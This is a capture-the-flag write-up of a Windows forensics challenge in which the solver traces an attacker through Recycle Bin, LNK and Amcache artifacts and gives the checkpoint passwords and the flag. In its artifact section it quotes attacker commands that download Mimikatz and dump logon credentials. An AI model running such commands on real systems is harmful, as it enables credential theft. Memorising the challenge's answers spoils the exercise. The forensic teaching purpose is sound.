# UTCTF 2026 — Watson (Forensics)
**Points:** 839 | **Solves:** 128 | **Author:** Jared (@jarpiano)

---

## Challenge Description

> We need your help again agent. The threat actor was able to escalate privileges. We're in the process of containment and we want you to find a few things on the threat actor. The triage is the same as the one in "Landfall". Can you read the briefing and solve your part of the case?

**Files provided:**
- `Modified_KAPE_Triage_Files.zip` — Windows KAPE triage collection
- `briefing.txt`
- `how-to-solve.txt`
- `checkpointA.zip`
- `checkpointB.zip`

---

## Flag

```
utflag{pr1v473_3y3-m1551n6_l1nk}
```

---

## Overview

This is a two-part Windows forensics challenge based on a KAPE triage collection. Two checkpoints must be completed, each locked with a password derived from investigating attacker activity.

| Checkpoint | Question | Password | Flag Part |
|---|---|---|---|
| A | Name of deleted secret project | `HOOKEM` | `pr1v473_3y3` |
| B | SHA1 of suspicious installed executable | `67198a3ca72c49fb263f4a9749b4b79c50510155` | `m1551n6_l1nk` |

---

## Environment

The dataset is a KAPE triage of a Windows system (`DESKTOP-A5LSTDI`). Key artifacts collected:
- `$MFT`, `$Recycle.Bin`, `$LogFile`, `$Extend/$J`
- Registry hives (`Amcache.hve`)
- Event logs (`winevt/logs/`)
- Browser artifacts (`logins.json`, `key4.db`)
- Prefetch files
- LNK/Recent files

---

## Attacker Activity Summary

The attacker performed the following actions on the compromised system:

1. Ran `whoami /all` to enumerate privileges
2. Downloaded and executed **Mimikatz** to dump credentials via `sekurlsa::logonpasswords`
3. Downloaded **Velociraptor** (`velociraptor-v0.75.2-windows-amd64.exe`) and ran it as a C2/DFIR server
4. Installed **VeraCrypt** for encrypted storage
5. Downloaded `ithqsu.zip` containing a malicious `calc.exe` payload
6. Deleted evidence — secret documents and executables sent to `$Recycle.Bin`

---

## Checkpoint A — "pr1v473_3y3"

### Question
> The threat actor deleted a word document containing secret project information. Can you retrieve it and submit the name of the project? *(Password is strictly uppercase)*

### Solution

List all files in `$Recycle.Bin` and parse the `$I` metadata files to recover original paths:

```python
import glob, struct

for f in glob.glob("Modified_KAPE_Triage_Files/C/$Recycle.Bin/S-1-5-21-*/$I*"):
    try:
        data = open(f, 'rb').read()
        path = data[28:].decode('utf-16-le').rstrip('\x00')
        size = struct.unpack('<Q', data[8:16])[0]
        print(f"{f} -> {path} ({size} bytes)")
    except:
        pass
```

Output reveals:
```
$I07YGFU.docx -> C:\Users\Administrator\Documents\SuperSecretFolder\SuperSecretProject.docx
```

Extract and read the recovered docx (`$R07YGFU.docx`):
```bash
unzip -p "$R07YGFU.docx" word/document.xml | python3 -c "
import sys, re
print(re.sub('<[^>]+>', '', sys.stdin.read()))
" | tr -s ' \n'
```

The document reveals the project name: **PROJECT HOOKEM**

Unlock Checkpoint A:
```bash
unzip -P "HOOKEM" checkpointA.zip -d ca_out
cat "ca_out/Checkpoint A/A.txt"
# => pr1v473_3y3
```

**PART1 = `pr1v473_3y3`**

---

## Checkpoint B — "m1551n6_l1nk"

### Question
> The threat actor installed a suspicious looking program that may or may not be benign. Retrieve the SHA1 Hash of the executable. *(Password is the SHA1 hash)*

### The Red Herring

The obvious candidates from `$Recycle.Bin` are:
- `$RZ7G627.exe` → `velociraptor-v0.75.2-windows-amd64.exe` (SHA1: `85f85356...`) ❌
- `$RNJXINC.exe` → `VSCodeUserSetup-x64-1.111.0.exe` (SHA1: `5f07b4cc...`) ❌

Both fail as zip passwords. These were red herrings.

### Finding the Real Malware

The key clue is in the LNK (Recent) files:

```bash
strings "Modified_KAPE_Triage_Files/C/Users/Administrator/AppData/Roaming/Microsoft/Windows/Recent/ithqsu.lnk"
# => C:\Users\Administrator\Downloads\ithqsu.zip
```

The attacker downloaded `ithqsu.zip` — a randomly named archive. KAPE didn't collect the zip contents, but **Amcache** records every executed binary.

### Amcache Analysis

Parse `Amcache.hve` with python-registry to find all executed files, filtering out Microsoft/system paths:

```python
from Registry import Registry

reg = Registry.Registry("Modified_KAPE_Triage_Files/C/Windows/AppCompat/Programs/Amcache.hve")

def walk(key):
    try:
        if 'InventoryApplicationFile' in key.path():
            vals = {v.name(): v.value() for v in key.values()}
            path = vals.get('LowerCaseLongPath', '')
            orig = vals.get('OriginalFileName', '')
            fid  = vals.get('FileId', '')
            size = vals.get('Size', 0)
            pub  = vals.get('Publisher', '')
            if path and 'ithqsu' in path:
                print(f"Path:     {path}")
                print(f"Original: {orig}")
                print(f"FileId:   {fid}")
                print(f"Size:     {size}")
                print(f"Publisher:{pub}")
    except: pass
    try:
        for sub in key.subkeys():
            walk(sub)
    except: pass

walk(reg.root())
```

Output:
```
Path:      c:\users\administrator\appdata\local\ithqsu\2ga2pl\calc.exe
Original:  helloworld.exe
FileId:    000067198a3ca72c49fb263f4a9749b4b79c50510155
Size:      4096
Publisher: .
```

### Why This Is Suspicious

| Indicator | Value | Why suspicious |
|---|---|---|
| Path | `ithqsu\2ga2pl\calc.exe` | Random directory name, not a real Windows path |
| OriginalFileName | `helloworld.exe` | Renamed to impersonate Windows Calculator |
| Size | 4096 bytes | Legitimate `calc.exe` is ~900KB |
| Publisher | `.` | Unsigned binary |

### Getting the SHA1

In Windows 10 Amcache, `FileId` = `0000` + SHA1 hash of the file.

Strip the leading `0000`:
```
000067198a3ca72c49fb263f4a9749b4b79c50510155
    ^---^ strip these 4 bytes
=> 67198a3ca72c49fb263f4a9749b4b79c50510155
```

Unlock Checkpoint B:
```bash
unzip -P "67198a3ca72c49fb263f4a9749b4b79c50510155" checkpointB.zip -d cb_out
cat "cb_out/Checkpoint B/B.txt"
# => m1551n6_l1nk
```

**PART2 = `m1551n6_l1nk`**

---

## Flag Assembly

```
utflag{pr1v473_3y3-m1551n6_l1nk}
```

---

## Key Forensic Artifacts

### PowerShell History (`ConsoleHost_history.txt`)
Attacker commands decoded from base64:
```powershell
whoami /all
wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip
Expand-Archive mimikatz.zip
C:\Users\jon\Downloads\mimikatz\x64\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

### Event Logs (`Application.evtx`)
Velociraptor startup events confirm it was run as a C2 server:
```
velociraptor-v0.75.2-windows-amd64.exe --config server.config.yaml frontend -v
```

### Recycle Bin (`$Recycle.Bin`)
| $R file | Original path |
|---|---|
| `$R07YGFU.docx` | `C:\Users\Administrator\Documents\SuperSecretFolder\SuperSecretProject.docx` |
| `$RZ7G627.exe` | `C:\Users\Administrator\Downloads\velociraptor-v0.75.2-windows-amd64.exe` |
| `$RNJXINC.exe` | `C:\Users\Administrator\Downloads\VSCodeUserSetup-x64-1.111.0.exe` |
| `$RR5UOFV.txt` | `C:\Users\Administrator\Documents\Note.txt` (contained password `longhornHACK123*`) |

### Amcache (`Amcache.hve`)
Key entry for the malicious binary:
```
calc.exe|bb6d3e29a64aae32
  LowerCaseLongPath: c:\users\administrator\appdata\local\ithqsu\2ga2pl\calc.exe
  OriginalFileName:  helloworld.exe
  FileId:            000067198a3ca72c49fb263f4a9749b4b79c50510155
  Size:              4096
  Publisher:         .
```

---

## Lessons Learned

1. **Always dump Amcache first** — filter out Microsoft/system paths and look for:
   - Random directory names
   - `OriginalFileName` ≠ `Name` (renamed executables)
   - Unsigned binaries (`Publisher = '.'`)
   - Tiny exe sizes in non-system paths

2. **LNK files are goldmines** — `ithqsu.lnk` pointed directly to the malicious zip. Always parse all Recent files early.

3. **Amcache FileId = `0000` + SHA1** — in Windows 10 Amcache, strip the 4-byte `0000` prefix from `FileId` to get the SHA1.

4. **$I metadata files** — always parse `$I*` files in `$Recycle.Bin` to recover original paths of deleted files before trying to analyze the `$R*` content files.

---

## Tools Used

| Tool | Purpose |
|---|---|
| `python-registry` | Parse `Amcache.hve` registry hive |
| `python-evtx` | Parse Windows event logs |
| `strings` | Extract strings from binaries and LNK files |
| `unzip` | Extract password-protected checkpoint zips |
| `sha1sum` | Compute file hashes |
| `msoffcrypto-tool` | Attempt docx decryption |

---

*Writeup by: qthevar*
*Challenge by: Jared (@jarpiano on Discord)*